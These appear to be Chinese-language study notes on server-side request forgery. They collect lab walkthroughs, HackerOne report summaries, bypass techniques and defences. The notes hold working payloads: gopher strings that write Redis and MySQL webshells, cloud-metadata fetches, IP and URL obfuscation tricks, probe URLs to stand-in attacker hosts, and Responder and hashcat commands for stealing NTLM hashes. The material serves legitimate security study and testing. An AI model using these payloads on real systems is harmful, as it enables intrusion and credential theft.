[TOC]

# 一、知识点

### 一. PortSwigger

#### 1、本地服务器的基本SSRF

抓请求包，发现存在一个socketapi，后面跟着的是网址，直接替换成 http://localhost/admin

#### 2、基本的目标不是漏洞机

发现改为loaclhost没用，提示内网网段是192.168.0.x，端口是8080，直接bp的intruder跑，最终发现目标在192.168.0.5上。

#### 3、Referer标头的外带SSRF

首先此URL是在Referer中的，并且没用回显，所以直接使用collaborator的url，外带。

#### 4、简单黑名单的SSRF

对127.0.0.1和admin进行了黑名单；

##### 黑名单绕过思路：

1. 短链，原理重定向

2. 对域名的黑名单：

   1. 域名解析

3. IP混淆

   1. ipv4非标准格式
   2. ipv6
   3. ip分段和省略

4. url编码

5. 对ip的黑名单：

   1. DNS重绑

   2. SNI + 域名注册解析

      ```
      客户端发送：
      
      	目标 IP 地址：1.2.3.4（这个不在黑名单中）
      	SNI 域名：evil.me -> 192.168.1.100
      
      服务端校验 IP：
      
      	1.2.3.4 没在黑名单 ✅，放行
      	代理或网关（如 Envoy）收到请求：
      	根据 SNI（evil.me）查找对应的 内部服务配置
      	实际将请求路由到 → 192.168.1.100
      ```

#### 5、重定向的SSRF

攻击面在重定向的url里

#### 6. 简单的白名单SSRF

##### 白名单绕过思路：

1. 对ip的白名单
   1. DNS重绑
2. 域名@：**`http://trusted.com@evil.com`**
3. 域名#：**`https://evil-host#expected-host`**
4. 注册域名：https://expected-host.evil-host

### 二、BWAPP

#### 1. SSRF + 文件包含漏洞 | 内网探测

````
http://**ip1**/bWAPP/rlfi.php?language=http://**ip2**/evil/ssrf-1.txt&action=go
POST DATA:**ip3**
````

解释：

1. ip1存在ssrf
2. ip2为自己的ip
3. ip3为目标的内网ip，ip2范围不了
4. 在ip1上又存在文件包含漏洞
5. ip2上放应该扫描脚本，让ip1包含

#### 2. XXE -> SSRF

| **维度**       | **XXE**                               | **SSRF**                               |
| :------------- | :------------------------------------ | :------------------------------------- |
| **触发机制**   | 通过恶意 XML 输入触发                 | 通过用户控制的 URL 参数触发            |
| **主要攻击面** | 文件读取、内网探测、DoS、SSRF 等      | 内网服务访问、云元数据窃取、端口扫描等 |
| **协议支持**   | 支持多种协议（HTTP、FILE、Gopher 等） | 通常依赖 HTTP/HTTPS                    |
| **防御重点**   | 禁用外部实体和 DTD                    | 校验请求目标、网络隔离                 |

当 XXE 的**外部实体指向一个网络资源**时，服务器会尝试发起请求，此时 XXE 的利用效果与 SSRF 一致。
**示例**：

```
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

- **效果**：服务器访问云元数据接口，**等同于 SSRF 攻击**。

### 三、pikachu

#### 1. file协议 | 读取文件

1. **协议支持广泛性**

   - 许多编程语言的网络库默认支持多种协议（如 `HTTP`、`HTTPS`、`FTP`、`File`）。
   - 例如：
     - **PHP** 的 `file_get_contents()` 支持 `file://`。
     - **Python** 的 `urllib.request.urlopen()` 支持 `file://`。

2. **输入验证不严**

   - 若服务端未对用户输入的协议类型进行过滤，攻击者可构造 `file://` 路径。

   - 示例漏洞代码（PHP）：

     ```
     $url = $_GET['url']; // 用户可控输入
     $content = file_get_contents($url);
     echo $content;
     ```

     攻击者提交 `?url=file:///etc/passwd`，服务器返回 `/etc/passwd` 内容。

3. **编码混淆绕过**

   - 攻击者可能对路径进行 URL 编码，绕过简单过滤：

     ```
     file://%2Fetc%2Fpasswd → 解码为 file:///etc/passwd
     ```

#### 2. dict协议 | **快速端口探测与服务识别**

| **服务名称**      | **默认端口** | **示例 Payload**                        | **响应特征**                                          | **攻击用途**                                                 |
| :---------------- | :----------- | :-------------------------------------- | :---------------------------------------------------- | :----------------------------------------------------------- |
| **Redis**         | 6379         | `dict://127.0.0.1:6379/info`            | 返回 Redis 版本、配置信息（如 `redis_version:6.0.9`） | 探测 Redis 服务、执行未授权命令（如 `FLUSHALL`、`CONFIG SET`） |
| **Memcached**     | 11211        | `dict://127.0.0.1:11211/stats`          | 返回统计信息（如 `STAT pid 1`、`STAT version 1.6.9`） | 探测 Memcached 服务、查看统计信息                            |
| **Elasticsearch** | 9200         | `dict://127.0.0.1:9200/_cluster/health` | 返回 JSON 格式集群健康信息（如 `"status":"green"`）   | 确认 Elasticsearch 服务状态                                  |
| **SSH**           | 22           | `dict://127.0.0.1:22/`                  | 返回 SSH 协议标识（如 `SSH-2.0-OpenSSH_8.2p1`）       | 探测 SSH 服务、获取版本信息                                  |
| **ZooKeeper**     | 2181         | `dict://127.0.0.1:2181/stat`            | 返回 ZooKeeper 状态（如 `Zookeeper version: 3.6.3`）  | 确认 ZooKeeper 服务存活                                      |
| **FTP**           | 21           | `dict://127.0.0.1:21/`                  | 返回 FTP 欢迎信息（如 `220 FTP Server ready`）        | 探测 FTP 服务、获取版本信息                                  |
| **SMTP**          | 25           | `dict://127.0.0.1:25/HELO`              | 返回 SMTP 响应（如 `250 smtp.example.com`）           | 探测 SMTP 服务、验证邮件服务器                               |
| **HTTP**          | 80/443       | `dict://127.0.0.1:80/GET / HTTP/1.0`    | 返回 HTTP 响应头（如 `HTTP/1.1 200 OK`）              | 探测 Web 服务、验证 HTTP 协议支持                            |
| **PostgreSQL**    | 5432         | `dict://127.0.0.1:5432/`                | 返回错误（如 `Protocol error`）或连接成功无响应       | 探测 PostgreSQL 端口开放状态                                 |
| **MySQL**         | 3306         | `dict://127.0.0.1:3306/`                | 返回 MySQL 协议握手包（需解析二进制数据）             | 探测 MySQL 服务存活                                          |
| **DNS**           | 53           | `dict://127.0.0.1:53/`                  | 无响应或返回协议错误（需 UDP 协议支持）               | 探测 DNS 服务端口开放状态                                    |
| **MongoDB**       | 27017        | `dict://127.0.0.1:27017/`               | 返回 MongoDB 协议握手包（需解析二进制数据）           | 探测 MongoDB 服务存活                                        |
| **RDP**           | 3389         | `dict://127.0.0.1:3389/`                | 返回 RDP 协议握手包（需解析二进制数据）               | 探测远程桌面服务状态                                         |
| **VNC**           | 5900         | `dict://127.0.0.1:5900/`                | 返回 RFB 协议标识（如 `RFB 003.008`）                 | 探测 VNC 服务版本                                            |

### 四、HackTricks 

#### 1. gopher协议 | RCE

##### 协议介绍：

Gopher协议是一种古老的、基于TCP的协议，支持直接指定IP、端口和任意字节流（payload）。这意味着攻击者可以通过Gopher协议构造几乎任何类型的TCP数据包，不仅限于HTTP请求，从而突破HTTP协议的限制。

Gopher协议支持构造完整的GET和POST请求数据包。攻击者可以先抓取请求的原始数据包（包括头部和body），将其转换为Gopher格式，通过SSRF漏洞发送到目标服务。

| **目标服务**          | **攻击场景**                                                 | **Payload 构造步骤**                                         | **修复建议**                                            |
| :-------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :------------------------------------------------------ |
| **Redis 未授权访问**  | 通过 `CONFIG SET` 修改持久化路径，写入 Webshell 或 SSH 密钥。 | 1. 构造 Redis 命令：`CONFIG SET dir /var/www/html` 2. 转换为 Gopher 格式并 URL 编码： `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$5%0d%0a12345%0d%0a*1%0d%0a$4%0d%0asave%0d%0a` | 1. 启用 Redis 密码认证 2. 禁止绑定公网 IP               |
| **MySQL 未授权执行**  | 利用无密码认证漏洞发送恶意 SQL 语句（需协议握手包构造）。    | 1. 构造 MySQL 认证包（十六进制）： `gopher://127.0.0.1:3306/_%01%00%00%01%85%00%00%00%00%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00` 2. 附加 SQL 语句（如 `SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'`）。 | 1. 强制密码认证 2. 禁用 `INTO OUTFILE` 权限             |
| **SMTP 邮件伪造**     | 伪造发件人发送钓鱼邮件或垃圾邮件。                           | 1. 构造 SMTP 命令序列： `HELO attacker.com%0d%0aMAIL FROM:<spoof@example.com>%0d%0aRCPT TO:<victim@example.com>%0d%0aDATA%0d%0aSubject: Test%0d%0aHello!%0d%0a.%0d%0aQUIT` 2. 生成 Gopher URL： `gopher://smtp.example.com:25/_HELO%20attacker.com%250d%250a...` | 1. 启用 SMTP 身份验证 2. 配置 SPF/DKIM/DMARC 反伪造策略 |
| **FastCGI RCE**       | 利用 PHP-FPM 未授权访问执行系统命令。                        | 1. 构造 FastCGI 请求包： `gopher://127.0.0.1:9000/_%01%01...{恶意载荷}...` 2. 载荷包含 `SCRIPT_FILENAME` 指向 PHP 文件，`PHP_VALUE` 注入代码。 | 1. 限制 FastCGI 监听地址 2. 配置 PHP-FPM 访问控制       |
| **Memcached 未授权**  | 通过 `set` 命令写入恶意缓存数据，触发反序列化漏洞。          | 1. 构造 Memcached 命令： `set key 0 3600 10%0d%0aevil_data%0d%0a` 2. 转换为 Gopher URL： `gopher://127.0.0.1:11211/_set%20key%200%203600%2010%0d%0aevil_data%0d%0a` | 1. 绑定本地回环地址 2. 启用 SASL 认证                   |
| **Zabbix 未授权 RCE** | 利用 Zabbix Server 的 `script.exec` 执行系统命令。           | 1. 构造 JSON-RPC 请求： `{"jsonrpc":"2.0","method":"script.update","params":{"scriptid":"1","command":"id"},"id":1}` 2. 转换为 Gopher 载荷： `gopher://zabbix-server:10051/_POST%20...` | 1. 限制 Zabbix Server 的 API 访问 2. 更新至最新版本     |
| **HTTP 请求伪造**     | 穿透内网访问管理接口（如 Jenkins、Kubernetes API）。         | 1. 构造 HTTP 请求头： `GET /manager/html HTTP/1.1%0d%0aHost: 192.168.1.100%0d%0a%0d%0a` 2. 生成 Gopher URL： `gopher://192.168.1.100:8080/_GET%20/manager/html%20HTTP/1.1%250d%250aHost:%20192.168.1.100%250d%250a%250d%250a` | 1. 网络隔离内网服务 2. 启用身份认证                     |

#### 2. http协议 | 获取元数据

**目标**：通过 SSRF 获取云服务的敏感信息。

**关键点**：

- 访问 AWS 元数据服务（如 `http://169.254.169.254/latest/meta-data/`）获取凭证。
- 在 AWS ECS 中，读取环境变量（如 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`）获取凭证 。

#### 3. PDF SSRF

- **恶意元素**：在 PDF 中嵌入指向内部服务的图像或字体 URL。

- **攻击流程**：

  1. 用户上传包含以下内容的 PDF：

     ```
     <</Type /Page/Contents [ <</Length 100>> stream
       BT /F1 20 Tf 100 700 Td (Click me) Tj ET
       <</Subtype /Image/Width 100/Height 100/ColorSpace /DeviceRGB/BitsPerComponent 8
         /Filter /ASCIIHexDecode /Length 50>> stream
       2 0 obj <</Length 10>> stream http://169.254.169.254/latest/meta-data/ 
     ```

  2. 服务器解析 PDF 时尝试加载外部图像，向云元数据接口发起请求。

  3. 响应数据可能被记录或返回给攻击者，导致敏感信息（如 IAM 凭证）泄露。

#### 4. Referer | SSRF

**目标**：利用 Referer 头部引发 SSRF。

**关键点**：

- 某些服务器会访问 Referer 头部中的 URL，攻击者可控制该头部引导服务器访问恶意资源 。[HackTricks](https://book.hacktricks.xyz/cn/pentesting-web/ssrf-server-side-request-forgery?utm_source=chatgpt.com)
- 使用工具（如 Burp Suite 的 Collaborator Everywhere 插件）辅助发现此类漏洞。[HackTricks](https://book.hacktricks.xyz/cn/pentesting-web/ssrf-server-side-request-forgery?utm_source=chatgpt.com)

#### 5. SNI | SSRF	

**一、SNI作用 | 支持多域名共享同一 IP 地址**

- **场景**：一台服务器（IP 地址）托管多个 HTTPS 网站（如 example.com 和 test.com），每个网站有独立的 SSL/TLS 证书。
- **问题**：在 TLS 握手时，服务器需要先提供证书，但 HTTP 请求的 Host 头（包含域名）在加密通道建立后才发送，服务器无法提前知道客户端想要哪个证书。
- SNI 的作用
  - 客户端在 TLS 握手的 ClientHello 消息中包含 SNI 扩展，指定目标域名（如 example.com）。
  - 服务器根据 SNI 值选择并返回对应的证书。
- **结果**：无需为每个域名分配独立 IP，降低了成本，广泛应用于虚拟主机、CDN 和云服务。

##### 二、利用

✅ 1. SNI 伪装访问内网 IP（绕过 IP 黑名单）

- 注册一个域名 `evil.me`，将其 DNS 指向 `192.168.1.100`
- 发起 SSRF 到 `https://evil.me`
- 设置 SNI 为 `evil.me`
- 服务器通过内部 DNS 解析 `evil.me`，请求到达内网服务 ✅

✅ 2. SNI + Nginx `$ssl_server_name` 动态代理 SSRF

```
proxy_pass https://$ssl_server_name;
```

- 发请求时设置 SNI 为内网 IP：`192.168.1.100`
- 即使请求 URL 是公网域名，服务端也会根据 SNI 反代进内网！

##### 三、案例

🧊 案例 1：AWS 元数据 SSRF 绕过（SNI 伪装）

```
curl --resolve metadata.aws:443:169.254.169.254 https://metadata.aws
```

- 你设置了 DNS：metadata.aws → 169.254.169.254（元数据地址）
- SNI 设置为 metadata.aws（看起来合法）
- 请求实际打到元数据服务器 ✅
- 获取 IAM 临时凭证、AccessKey 等敏感数据

🧊 案例 2：Nginx SSRF 利用 `$ssl_server_name`

```
proxy_pass https://$ssl_server_name;

openssl s_client -connect target.com:443 -servername 192.168.1.100
```

- 客户端设置 `SNI: 192.168.1.100`
- 请求发给 `target.com`
- 服务器看到 `$ssl_server_name = 192.168.1.100`
- 自动反代到 `https://192.168.1.100` ✅

#### 6. 代理劫持 | SSRF （类似SNI Nginx SSRF)

**攻击姿势**：
通过控制中间代理或反向代理的标头（如 `X-Forwarded-Host`），篡改请求目标。
**示例请求**：

```
POST /ssrf?target=https://go.dialexa.com HTTP/1.1
Host: victim.com
X-Original-Host: 127.0.0.1  # 篡改代理标头
```

**攻击逻辑**：

- 反向代理（如 Nginx）可能信任 `X-Original-Host` 标头，覆盖实际 Host：

  ```
  location /ssrf {
      proxy_pass http://$http_x_original_host;  # 漏洞点
  }
  ```

- 实际请求被代理到 `http://127.0.0.1`，而非 `go.dialexa.com`。

**生效条件**：

- 代理服务信任并解析特定标头（如 `X-Forwarded-For`、`X-Original-Host`）。
- 标头值未被过滤，允许注入内网 IP 或域名。

#### 7. 为什么SSRF很少使用file://


1. SSRF 的核心是：**绕过网络边界**，去请求 **外部或内网资源**；
2. `file://` 协议不走网络栈，它直接访问本地文件系统；
3. 用 `file://` 就完全脱离了这个核心，实战中用处非常有限。

# 二、案例

### 1. SSRF | 获取元数据 |  账户接管

[Autodesk | Report #3024673 - SSRF in Autodesk Rendering leading to account takeover | HackerOne](https://hackerone.com/reports/3024673)

### 2. AppStore | 版本上传表单 | Blind SSRF

[Nextcloud | Report #2925666 - Blind SSRF Vulnerability in Appstore Release Upload Form | HackerOne](https://hackerone.com/reports/2925666)

- 攻击者提交以下恶意 URL，探测服务器是否访问了指定地址：

  ```
  icon_url=http://attacker.com/log?payload=test
  ```

  通过检查 `attacker.com` 的访问日志，若发现来自 AppStore 服务器的请求，则确认漏洞存在。

- 进一步利用：

  ```
  icon_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  # 获取云服务器临时凭证
  ```

### 3. HOST SSRF

[IBM | Report #2696271 - SSRF via host header let access localhost via https://go.dialexa.com | HackerOne](https://hackerone.com/reports/2696271)

#### 一、为什么HOST修改不会影响正常访问

✅ 实际请求是由目标服务器发出的，它会根据 URL 的主机名去解析 IP 并建立连接。

请求流程通常是这样的：

```
目标服务发出 HTTP 请求 -> 解析 URL 中的主机名 -> 建立 TCP 连接 -> 发送 HTTP 请求（包含 Host）
```

举例：

```
http复制编辑POST https://eva2.csdn.net/v3/xxx HTTP/1.1
Host: 127.0.0.1
```

此时：

- **TCP 连接建立在 `eva2.csdn.net` 这个域名解析出来的 IP 上**
- **HTTP 请求头里的 Host 不影响实际连接目标**

#### 二、案例

**攻击姿势**：
篡改 `Host` 标头，诱导服务器向该地址发起内部请求。
**示例请求**：

```
GET /api/health HTTP/1.1
Host: 127.0.0.1:8080  # 篡改后的目标
```

**攻击逻辑**：

- 服务器代码使用 `Host` 标头动态生成内部请求：

  ```
  internal_url = f"http://{request.headers['Host']}/admin"
  requests.get(internal_url)  # 实际访问 http://127.0.0.1:8080/admin
  ```

- 请求仍发送到 `victim.com` 的公网 IP，但服务器自身会代理访问 `127.0.0.1`。

**生效条件**：

- 应用程序逻辑依赖 `Host` 标头构造请求地址。
- 服务器可访问本地或内网服务（如本地数据库、管理接口）。

### 4.  Turbonomic 的 终端节点 |  SSRF 获取元密钥

[IBM | Report #2697592 - SSRF and secret key disclosure found on Turbonomic endpoint | HackerOne](https://hackerone.com/reports/2697592)

[IBM | Report #2697601 - SSRF and secret key disclosure found on Turbonomic endpoint | HackerOne](https://hackerone.com/reports/2697601)

#### 一、介绍

**Turbonomic** 是一款用于混合云环境的资源优化与管理平台，其核心功能包括自动化资源分配、性能监控和成本优化。由于需要深度集成云服务、虚拟化平台及物理基础设施，Turbonomic 通常拥有高权限访问各类 API 和内部系统。
**终端节点（Endpoint）** 是 Turbonomic 对外提供 API 或管理接口的入口，若存在安全缺陷，可能成为攻击者渗透的突破口。

#### 二、漏洞分析

- **触发点**：
  Turbonomic 的某个 API 终端节点接受用户可控的 URL 参数，用于请求外部资源（如获取监控数据、集成第三方服务）。
  **示例请求**：

  ```
  POST /api/v3/fetch-resource HTTP/1.1
  Host: turbonomic.example.com
  ...
  {
      "resource_url": "http://user-provided-url.com/data"
  }
  ```

- **漏洞逻辑**：
  若后端未对 `resource_url` 进行合法性校验，攻击者可构造恶意 URL（如内网地址、云元数据接口），诱导 Turbonomic 服务器发起内部请求。

### 5. POST | Blind SSRF

[Acronis | Report #1086206 - Blind SSRF vulnerability on cz.acronis.com | HackerOne](https://hackerone.com/reports/1086206)

**漏洞复现步骤（PoC）**：

1. 发送以下 **POST 请求**，在 `address` 参数中注入恶意 URL：

   ```
   POST /wp-admin/admin-ajax.php HTTP/1.1
   Host: cz.acronis.com
   ...
   address=http://jczo3ewu8jpfgyiajmkacspsnjtbh0.burpcollaborator.net/ssrf
   ```

2. 服务器响应 `200 OK`，并触发对 `Burp Collaborator` 的 **回调请求**（来源 IP：`109.123.216.85`）。

**漏洞影响**：

- 允许未认证攻击者诱导 WordPress 向任意地址（包括内网服务）发起 HTTP 请求。
- 可进一步用于 **内部网络探测**、**敏感数据泄露** 或 **网络放大攻击**。

### 6. CVE-2024-40898利用 | SSRF + 泄露 NTLM 

[Internet Bug Bounty | Report #2612028 - important: Apache HTTP Server: SSRF with mod_rewrite in server/vhost context on Windows (CVE-2024-40898) | HackerOne](https://hackerone.com/reports/2612028)

#### 一、CVE介绍

**漏洞编号**：CVE-2024-40898

**影响组件**：Apache HTTP Server（Windows 平台）[tenablecloud.cn+7hkcert.org+7腾讯云 - 产业智变 云启未来+7](https://www.hkcert.org/tc/security-bulletin/apache-http-server-multiple-vulnerabilities_20240719?utm_source=chatgpt.com)

**影响版本**：2.4.0 至 2.4.61[httpd.apache.org+2GitHub+2hkcert.org+2](https://github.com/TAM-K592/CVE-2024-40725-CVE-2024-40898?utm_source=chatgpt.com)

**漏洞类型**：服务器端请求伪造（SSRF）[hkcert.org+4阿里云漏洞库+4腾讯云 - 产业智变 云启未来+4](https://avd.aliyun.com/detail?id=AVD-2024-40898&utm_source=chatgpt.com)

**CVSS v3 分数**：7.5（高危）

**修复版本**：2.4.62[腾讯云 - 产业智变 云启未来+6tenablecloud.cn+6NVD+6](https://www.tenablecloud.cn/plugins/was/114385?utm_source=chatgpt.com)

#### 二、复现

1. **搭建恶意 SMB 服务器**：
   使用 `Responder` 或 `Impacket` 监听 SMB 流量：

   ```
   responder -I eth0 -wrf
   ```

2. **触发 SSRF**：
   发送构造的请求至漏洞 URL：

   ```
   GET /redirect?path=\\attacker-ip\share HTTP/1.1
   Host: victim.com
   ```

3. **捕获哈希**：
   `Responder` 将捕获服务器的 NetNTLMv2 哈希，保存为 `hash.txt`。

#### 2. 破解哈希

使用 `Hashcat` 进行离线破解：

```
hashcat -m 5600 hash.txt /path/to/wordlist.txt
```

### 7. POST | SSRF

[Rocket.Chat | Report #1886954 - Unauthenticated full-read SSRF via Twilio integration | HackerOne](https://hackerone.com/reports/1886954)

####  Twilio Webhook 功能背景:

- **Twilio 集成**：
  Rocket.Chat 支持通过 Twilio 接收短信或语音通话通知。当 Twilio 接收到外部事件（如用户回复短信）时，会通过 **Webhook 回调** 将数据发送到 Rocket.Chat 的指定端点（如 `/services/voip/events`）。
- **参数处理**：
  Webhook 端点可能解析 Twilio 请求中的参数（如 `Caller`、`From`、`RecordingUrl`），并基于这些参数发起后续操作（如下载录音文件）。

#### 2. 漏洞触发点

- **未过滤的 URL 参数**：
  若 Rocket.Chat 在处理 Twilio 回调时，直接使用用户可控的 URL 参数（如 `RecordingUrl`）发起 HTTP 请求，且未校验目标地址的合法性，攻击者可注入恶意 URL。
  **示例请求**：

  ```
  POST /services/voip/events HTTP/1.1
  Host: rocket.chat.example.com
  ...
  {
      "CallSid": "CAXXXXX",
      "RecordingUrl": "http://169.254.169.254/latest/meta-data"  // 恶意注入
  }
  ```

- **代码逻辑缺陷**：
  漏洞版本的 Rocket.Chat 可能直接调用类似 `HTTP.get(RecordingUrl)` 的代码，未限制目标地址范围。

### 8. CVE-2024-24806 | NodeJS | SSRF

#### 一、漏洞编号：

- **CVE**：CVE-2024-24806
- **影响组件**：`libuv`（Node.js 使用的底层异步 I/O 库）
- **影响范围**：所有 Node.js >= v10 的版本（只要依赖 libuv）

#### 二、 漏洞成因：

```
js复制编辑// 开发者检查是否包含内部网地址
const url = req.query.url;
if (url.includes('127.0.0.1') || url.includes('localhost')) {
    return res.status(403).send('Blocked');
}

http.get(url); // ⚠️ 直接使用，易受攻击
```

攻击者输入：

```
http://aaaaaaaaaaa...aaa0x7f000001
```

由于字符串太长，**开发者的检查逻辑不会发现结尾是 0x7f000001**，但 `libuv` 在调用 `getaddrinfo()` 前会截断为：

```
复制编辑
0x7f000001
```

而这个实际上等价于：

```
复制编辑
127.0.0.1
```

最终 SSRF 成功！

### 9. IPv6绕过 IP黑名单

[HackerOne | Report #2301565 - Server Side Request Forgery (SSRF) in webhook functionality | HackerOne](https://hackerone.com/reports/2301565)

#### 1. IPv6 映射地址解析缺陷

- **IPv4-mapped IPv6 格式**：
  根据 [RFC 4291](https://datatracker.ietf.org/doc/html/rfc4291)，IPv4 地址可嵌入 IPv6 地址中，格式为 `::ffff:<IPv4>`（如 `::ffff:127.0.0.1`）。
- **压缩表示**：
  IPv6 地址允许省略前导零，例如 `::ffff:a9fe:a9fe` 等价于 `::ffff:169.254.169.254`（AWS 元数据服务 IP）。

#### 2. 漏洞触发逻辑

- **攻击载荷构造**：
  攻击者在 Webhook 的 URL 参数中使用压缩的 IPv6 映射地址，绕过对 `169.254.169.254` 的黑名单过滤。
  **示例**：

  ```
  header("Location: http://[::ffff:a9fe:a9fe]");  // 实际指向 169.254.169.254
  ```

- **服务器行为**：
  应用程序解析 URL 时未规范化 IPv6 地址，直接发起请求，导致访问内部服务。

#### 3. 漏洞利用条件

- **输入控制**：
  Webhook 功能允许用户指定任意 URL。
- **缺乏规范化校验**：
  未对 IPv6 地址进行展开和标准化处理，且黑名单仅覆盖 IPv4 格式。
- **服务器出站权限**：
  服务器可访问内部网络或云元数据接口。

### 10. GET | SSRF

[inDrive | Report #2300358 - SSRF in https://couriers.indrive.com/api/file-storage | HackerOne](https://hackerone.com/reports/2300358)

#### 复现步骤（Steps To Reproduce）

以 Burp Collaborator 为例展示漏洞触发过程：

1. 发起如下请求（将 `url` 参数替换为你自己的 OAST 域名）：

   ```
   GET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com
   ```

2. 查看响应内容 & Burp Collaborator 的日志，发现目标服务器发出了对你提供域名的请求，说明 SSRF 成立。

### 11. 邮件应用程序中的盲SSRF

[Nextcloud | Report #1869714 - Blind SSRF in Mail App | HackerOne](https://hackerone.com/reports/1869714)

#### 漏洞复现与验证：

1. **搭建监听服务**：
   使用 **Burp Collaborator** 或 **Interactsh** 生成唯一域名（如 `ssrf-test.attacker.com`）。

2. **构造恶意邮件**：
   在邮件正文或附件中插入监听 URL：

   ```
   <img src="http://ssrf-test.attacker.com">
   ```

3. **发送邮件并监控**：
   观察监听服务是否收到来自邮件服务器的 HTTP/DNS 请求。
   ://hackerone.com/reports/1869714)

# 三、自我理解

## 一、防御技巧

#### waf:

1. 解析各种花哨的url编码（域名、ip），而不被欺骗

   ```
   scheme://[userinfo:passwd@]host[:port]/path[?query1][&query2;query3][#fragment]
   ```

2. 针对url的每个部分进行过滤

   1. scheme白名单：http、https

   2. host=域名

      1. 域名：白名单

      2. 域名->ip->ip黑名单（ipv4、ipv6都考虑）

         ```
         1. 具体地址
         2. 具体地址+CIDR
         3. 范围地址+CIDR
         3. ipv6
         4. ipv6->ipv4
         5. 全地址
         ...
         ```

   3. port->白名单:80、443

3. **验证请求头**、URL中的CRLF

4. 验证SNI字段

####  后端代码:

1. 和waf一样
2. 解析重定向->ip名单、禁用重定向
3. 使用解析并且通过了ip校验的ip去访问，而不是使用原url去访问（**url解析绕过**）

####  防火墙/网络策略:

1. ip白名单/黑名单出战
1. 使用内部dns->比外部dns多了层过滤
1. 使用dns pinning->强制缓存第一次解析的ip至少超过一次请求的完整时间

## 二、绕过技巧

#### 绕过ip黑名单（就赌它的解析做的不咋地）

**ipv4：**32bit 标准 点分10

1. 点分：二进制、八进制、十六进制、混合进制

2. 整数：二、八、十、十六进制

3. 点分变体

   1. 忽略前导0

      ```
      192.168..1 => 192.168.0.1
      ```

   2. 部分点分

      ```
      192.11010049
      ```

4. CIDR

   1. 具体ip/全段
   2. 范围ip/范围段

**ipv6：**128 bit 标准 冒号分16

1. 普通压缩

   ```
   0000:0000:0000:0000:0000:0000:0000:0001 == 0:0:0:0:0:0:0:1 == ::1 ==> 回环地址
   fe80::1 ==> 链路本地地址 == 回环地址
   ```

2. 整数10、16进制

3. CIDR

   1. 具体ip/全段
   2. 范围ip/范围段

**ipv6->ipv4:**

```
::ffff:ipv4点分10
::ffff:整数10、八、16进制
```

##### 全地址：

0.0.0.0/[::]，黑名单防护可能缺少这种，但是解析又可能解析成本地地址。

#### 绕过域名黑名单+ip黑名单

##### 短链：(重定向)

1. DNS重定向：短链的DNS解析到内网IP
2. 代理劫持跳转：控制这个短链服务器，访问这个URL，返回302跳转到内网

##### DNS重绑定：（TTL=0 + 多次请求）

1. 购买一个服务器，配置为dns服务器
2. 购买一个域名，在这个dns服务器上解析这个域名
   1. 配置解析规则为每次访问这个域名都需要访问dns重新解析ip
   2. 配置解析为：外网ip、内网ip，轮询
3. intruder快速跑ssrf
   1. 因为：单次请求只需要解析一次dns就行了，即使不缓存
   2. 但是：多次请求，你上一次发的请求解析的是外网ip绕过了ip黑名单代码，在这次请求结束前，下一次请求又来了，需要重新访问dns，解析成内网ip，于是上一次的请求去访问内网了，而这一次的成了炮灰，被ip黑名单拦了。

#### URL解析绕过：

原理：

​	解析是解析了，过滤是过滤了，但是过了之后，又用原url去访问，访问解析和之前过滤解析之间有差异。。

```
http://evil.com/../127.0.0.1
http://127.0.0.1/../evil.com
```

```
http://evil.com\127.0.0.1
http://127.0.0.1\evil.com
```

```
http://evil.com:80@127.0.0.1:8080
http://127.0.0.1:8080@evil.com:80
```

```
http://evil.com;127.0.0.1
http://127.0.0.1;evil.com
```

#### 请求头绕过：

原理：

​	后端请求t有时使用请求头，而不是url

1. 直接使用请求头

   | Header 名称                 | 用途 / 含义                        | 可能影响或用途                            | 常见受影响中间件 / 服务              | 风险说明                                                     |
   | :-------------------------- | :--------------------------------- | :---------------------------------------- | :----------------------------------- | :----------------------------------------------------------- |
   | **`Referer`**               | **表示请求的来源页面 URL**         | **用于防盗链、来源分析、CSRF 防护检查等** | **所有 Web 服务器、应用框架、WAF**   | **可被伪造，导致：1. 绕过基于来源的访问控制/防盗链；2. 干扰 CSRF 防护逻辑（如果依赖 Referer 校验）；3. 泄露用户浏览历史（隐私风险）；4. 欺骗服务器执行操作（如误导后台认为请求来自可信来源）** |
   | `Host`                      | HTTP 请求目标域名                  | 控制目标主机地址，欺骗后端或代理          | nginx、Apache、Node.js、Python WSGI  | 控制实际请求目标或触发内部路由                               |
   | `X-Host`                    | 非标准字段，有些框架错误使用       | 替代 Host 头欺骗请求目标                  | Express.js、某些 Node.js 应用        | 可用作 Host 的备选值                                         |
   | `X-Forwarded-For`           | 表示原始客户端 IP                  | 可伪造为 127.0.0.1 绕过内网 IP 检测       | nginx、Traefik、Spring Cloud Gateway | 判断来源是否为内网，伪造可提权                               |
   | `X-Real-IP`                 | 表示真实客户端 IP                  | 与 `X-Forwarded-For` 类似                 | nginx、Apache                        | 被用于认证/日志审计，伪造可绕过限制                          |
   | `X-Forwarded-Host`          | 表示原始请求的 Host                | 可影响反代重定向目标                      | nginx、Apache、Spring                | SSRF 到重定向目标可能被控制                                  |
   | `X-Forwarded-Proto`         | 表示原始协议（http/https）         | 控制后端行为（如是否启用 HTTPS 安全跳转） | nginx、Spring Boot                   | 某些服务会根据协议切换行为                                   |
   | `Forwarded`                 | 标准化头部：proto, for, host       | 代替多个 X-Forwarded- 系列字段            | Envoy、Traefik、Caddy                | 可被解析为来源或目标控制                                     |
   | `X-Original-URL`            | 某些代理中记录原始 URL             | 可被后端服务器使用作为实际访问路径        | IIS、某些 Node.js 代理               | 可伪造 URL 实现重写                                          |
   | `X-Rewrite-URL`             | 与 `X-Original-URL` 类似           | URL 重写相关                              | IIS、Tomcat                          | SSRF 中可能重写访问地址                                      |
   | `X-Custom-IP-Authorization` | 某些定制逻辑判断是否授权 IP        | 可伪造为 127.0.0.1                        | 定制业务逻辑                         | 常见于业务层 SSRF 绕过                                       |
   | `True-Client-IP`            | Akamai/CDN 用于识别真实客户端 IP   | 可用于伪造原始请求来源 IP                 | Akamai、Cloudflare、Fastly           | 源地址判断绕过                                               |
